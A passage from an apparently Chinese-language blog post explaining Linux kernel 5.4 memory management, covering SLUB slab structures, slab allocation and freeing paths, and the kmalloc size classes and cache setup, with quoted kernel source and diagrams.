src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/alloc3-0.png" class title="alloc3-0"><p>内存释放源码逻辑</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/freepages.png" class title="freepages"><p>页物理视图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E7%89%A9%E7%90%86.png" class title="物理"><p>一次释放的过程</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E9%87%8A%E6%94%BE.png" class title="释放"><h1 id="slab"><a href="#slab" class="headerlink" title="slab"></a>slab</h1><p>内核版本5.4，slub</p><h2 id="slab数据结构体"><a href="#slab数据结构体" class="headerlink" title="slab数据结构体"></a>slab数据结构体</h2><p>slab结构图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/slab.jpg" class title="slab"><ul><li><p>kmem_cache结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-comment">/* Used for retrieving partial slabs, etc. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* The size of an object including metadata */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* The size of an object without metadata */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* Free pointer offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* Allocation and freeing of slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">max</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* gfp flags to use on each alloc */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* Refcount for slab cache destroy */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* Offset to metadata */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* Alignment */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* List of slab caches */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* Usercopy region offset */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* Usercopy region size */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>flags：管理标志位</p><ul><li><p>SLAB_HWCACHE_ALIGN：需要进行cache line（64位）对齐</p></li><li><p>SLAB_POISON：需要填充特殊字节表示状态</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/poison.jpg" class title="poison"></li><li><p>SLAB_RED_ZONE：需要插入red zone防止越界读写</p></li><li><p>SLAB_CACHE_DMA：slab中内存来自哪个内存区域</p></li><li><p>SLAB_STORE_USER：追踪对象的分配释放信息，追加两个track块</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/track.jpg" class title="track"></li></ul></li><li><p>size：slab对象真实大小</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/size.jpg" class title="size"></li><li><p>object_size：使用的内存大小（上图object size蓝色部分）</p></li><li><p>offset：freepointer的偏移</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/freepointer.jpg" class title="freepointer"></li><li><p>oo：储存slab需要的page个数</p></li><li><p>max：oo的最大值，初始化为oo</p></li><li><p>min：oo的最小值，初始化为1</p></li><li><p>allocflags：分配时所用的标志位</p></li><li><p>inuse：word size对齐后的大小</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/inuse.jpg" class title="inuse"></li><li><p>align：综合word size，cache line，align计算一个合理的对齐尺寸</p></li><li><p>name：slab cache的名称</p></li><li><p>refcount：引用计数</p></li><li><p>list：kmem_cache用双向链表串联</p></li><li><p>cpu_slab：每个cpu有一个slab本地缓存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* Pointer to next available object */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><span class="hljs-comment">/* The slab from which we are allocating */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>freelist：该slab第一个空闲对象</li><li>tid：cpu编号</li><li>page：slab所在的page</li><li>partial：备用的slab</li></ul></li><li><p>node：备用slab（每个NUMA节点一个）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> list_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_partial;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">partial</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span><br><span class="hljs-type">atomic_long_t</span> nr_slabs;<br><span class="hljs-type">atomic_long_t</span> total_objects;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">full</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>nr_patial：该NUMA节点备用slab个数</li><li>patial：备用slab用一个patial双链表串联起来</li><li>full：串联所有分配完的slab</li></ul></li></ul></li><li><p>page结构体中slab相关成员（高版本另有slab结构体），一个page是一个slab</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* slab, slob and slub */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* Partial pages */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_64BIT</span><br><span class="hljs-type">int</span> pages;<span class="hljs-comment">/* Nr of pages left */</span><br><span class="hljs-type">int</span> pobjects;<span class="hljs-comment">/* Approximate count */</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-type">short</span> <span class="hljs-type">int</span> pages;<br><span class="hljs-type">short</span> <span class="hljs-type">int</span> pobjects;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span> <span class="hljs-comment">/* not slob */</span><br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* first free object */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">void</span> *s_mem;<span class="hljs-comment">/* slab: first object */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<span class="hljs-comment">/* SLUB */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* SLUB */</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>slab_list：slab所在管理链表</li><li>next：partial使用</li><li>pages：slab所在管理链表中的包含的slab总数</li><li>pobjects：slab所在管理链表中包含的对象总数</li><li>slab_cache：指向kmem_cache</li><li>freelist：指向slab中第一个空闲对象，slab放进cpu_slab后将这个指针赋给cpu_slab，然后置空</li><li>inuse：使用的空间</li><li>objects：包含的对象个数</li><li>frozen：1表示在本地cpu缓存中</li></ul></li></ul><h2 id="分配逻辑"><a href="#分配逻辑" class="headerlink" title="分配逻辑"></a>分配逻辑</h2><ul><li><p>从本地cpu缓存中分配（fast path）：查看freelist是否有空闲对象</p></li><li><p>从本地cpu缓存partial列表中分配：本地cpu缓存的slab（page）中没有空闲对象</p><ul><li>遍历partial列表，找一个满足分配的slab</li><li>将这个slab从partial中摘下，提升为本地cpu缓存</li></ul></li><li><p>从NUMA节点缓存中分配：遍历kmem_cache_node-&gt;partial列表，将链表中的slab摘下来填充到本地cpu缓存的partial链表中（最多cpu_partial &#x2F; 2个）</p></li><li><p>从buddy system中重新申请slab：最开始slab是空的</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/%E7%A9%BAslab.jpg" class title="空slab"><p>初始化新申请的slab，提升为cpu本地缓存的page</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/newslab.jpg" class title="newslab"></li></ul><p>函数调用关系图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/alloc.jpg" class title="alloc111"><h2 id="释放逻辑"><a href="#释放逻辑" class="headerlink" title="释放逻辑"></a>释放逻辑</h2><ul><li>释放对象所属slab在cpu本地缓存中（fast path）：直接放回cpu本地缓存的slab</li><li>释放对象所属slab在cpu本地缓存partial链表中：直接释放</li><li>释放对象所属slab从full变成partial（slab不在cpu本地缓存中）<ul><li>对象放回slab并将slab放入本地cpu缓存的partial链表中（partial中slab个数未超标）</li><li>将partial链表中的所有slab转移至对应NUMA节点的node-&gt;partial链表的尾部，再将slab插入本地缓存的partial链表（partial中slab个数超标）</li></ul></li><li>释放对象所属slab从partial变成empty<ul><li>不是活跃slab，放回kmem_cache_node-&gt;partial链表（partial中slab个数未超标，min_partial）</li><li>放回buddy system（partial中slab个数超标）</li></ul></li></ul><p>函数调用关系图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/free.jpg" class title="free111"><h2 id="slab内存池的创建初始化流程"><a href="#slab内存池的创建初始化流程" class="headerlink" title="slab内存池的创建初始化流程"></a>slab内存池的创建初始化流程</h2><p>就放一张函数调用关系图</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/create.jpg" class title="create"><h2 id="slab内存池的销毁"><a href="#slab内存池的销毁" class="headerlink" title="slab内存池的销毁"></a>slab内存池的销毁</h2><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/destroy.jpg" class title="destroy"><h2 id="kmalloc体系"><a href="#kmalloc体系" class="headerlink" title="kmalloc体系"></a>kmalloc体系</h2><p>kmalloc体系基于slab allocator体系，本质是不同尺寸的通用slab cache</p><h3 id="kmalloc内存块尺寸"><a href="#kmalloc内存块尺寸" class="headerlink" title="kmalloc内存块尺寸"></a>kmalloc内存块尺寸</h3><p>slab cache信息储存在kmalloc_info数组中，由kmalloc_info_struct结构体表示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmalloc_info_struct</span> &#123;</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<br>&#125; kmalloc_info[];<br></code></pre></td></tr></table></figure><ul><li>name：slab cache名字</li><li>size：内存块大小</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmalloc_info_struct</span> <span class="hljs-title">kmalloc_info</span>[] __<span class="hljs-title">initconst</span> =</span> &#123;<br>&#123;<span class="hljs-literal">NULL</span>,                      <span class="hljs-number">0</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-96&quot;</span>,             <span class="hljs-number">96</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-192&quot;</span>,           <span class="hljs-number">192</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-8&quot;</span>,               <span class="hljs-number">8</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-16&quot;</span>,             <span class="hljs-number">16</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-32&quot;</span>,             <span class="hljs-number">32</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-64&quot;</span>,             <span class="hljs-number">64</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-128&quot;</span>,           <span class="hljs-number">128</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-256&quot;</span>,           <span class="hljs-number">256</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-512&quot;</span>,           <span class="hljs-number">512</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-1k&quot;</span>,           <span class="hljs-number">1024</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-2k&quot;</span>,           <span class="hljs-number">2048</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-4k&quot;</span>,           <span class="hljs-number">4096</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-8k&quot;</span>,           <span class="hljs-number">8192</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-16k&quot;</span>,         <span class="hljs-number">16384</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-32k&quot;</span>,         <span class="hljs-number">32768</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-64k&quot;</span>,         <span class="hljs-number">65536</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-128k&quot;</span>,       <span class="hljs-number">131072</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-256k&quot;</span>,       <span class="hljs-number">262144</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-512k&quot;</span>,       <span class="hljs-number">524288</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-1M&quot;</span>,        <span class="hljs-number">1048576</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-2M&quot;</span>,        <span class="hljs-number">2097152</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-4M&quot;</span>,        <span class="hljs-number">4194304</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-8M&quot;</span>,        <span class="hljs-number">8388608</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-16M&quot;</span>,      <span class="hljs-number">16777216</span>&#125;,&#123;<span class="hljs-string">&quot;kmalloc-32M&quot;</span>,      <span class="hljs-number">33554432</span>&#125;,<br>&#123;<span class="hljs-string">&quot;kmalloc-64M&quot;</span>,      <span class="hljs-number">67108864</span>&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>index &gt; 2 时size为2 ^ index</li><li>由于内核大部分申请大小都在192和96左右所以单独提供这两种大小的slab cache</li></ul><p>size_index[24]数组用于定义小于192大小的内存块的大小选取规则</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>注释内是申请大小，数组元素是slab cache对应下标</p><p>申请尺寸大于192时使用fls函数计算，fls可以获取参数的最高有效bit的位数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * fls = Find Last Set in word</span><br><span class="hljs-comment"> * @result: [1-32]</span><br><span class="hljs-comment"> * fls(1) = 1, fls(0x80000000) = 32, fls(0) = 0</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> __attribute__ ((<span class="hljs-type">const</span>)) <span class="hljs-type">int</span> <span class="hljs-title function_">fls</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> x)</span><br>&#123;<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-string">&quot;fls.f%0, %1\n&quot;</span>  <span class="hljs-comment">/* 0:31; 0(Z) if src 0 */</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;add.nz%0, %0, 1\n&quot;</span>  <span class="hljs-comment">/* 0:31 -&gt; 1:32 */</span></span><br><span class="hljs-params">: <span class="hljs-string">&quot;=r&quot;</span>(n)<span class="hljs-comment">/* Early clobber not needed */</span></span><br><span class="hljs-params">: <span class="hljs-string">&quot;r&quot;</span>(x)</span><br><span class="hljs-params">: <span class="hljs-string">&quot;cc&quot;</span>)</span>;<br><br><span class="hljs-keyword">return</span> n;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="kmalloc架构"><a href="#kmalloc架构" class="headerlink" title="kmalloc架构"></a>kmalloc架构</h3><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/kmalloc%E5%86%85%E5%AD%98%E6%B1%A0.jpg" class title="kmalloc内存池"><p>所有的kmem_cache储存在一个全局数组中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><ul><li><p>第一个下标表示物理内存区域类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>第二个下标表示slab cache</p></li></ul><h3 id="kmalloc体系的创建"><a href="#kmalloc体系的创建" class="headerlink" title="kmalloc体系的创建"></a>kmalloc体系的创建</h3><p>函数调用流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">start_kernel -&gt; mm_init -&gt; kmem_cache_init<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __init <span class="hljs-title function_">kmem_cache_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* slab allocator体系的创建初始化 */</span><br><span class="hljs-comment">/* Now we can use the kmem_cache to allocate kmalloc slabs */</span><br>setup_kmalloc_cache_index_table();<br>create_kmalloc_caches(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要就是两个函数</p><ul><li>setup_kmalloc_cache_index_table：初始化size_index数组</li><li>create_kmalloc_caches：创建初始化kmalloc_caches二维数组</li></ul><h3 id="kmalloc内存池的分配和回收"><a href="#kmalloc内存池的分配和回收" class="headerlink" title="kmalloc内存池的分配和回收"></a>kmalloc内存池的分配和回收</h3><p>kmalloc分配</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/kmalloc_alloc.jpg" class title="kmalloc_alloc"><p>kfree回收（过于简单甚至不配拥有一张图）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span 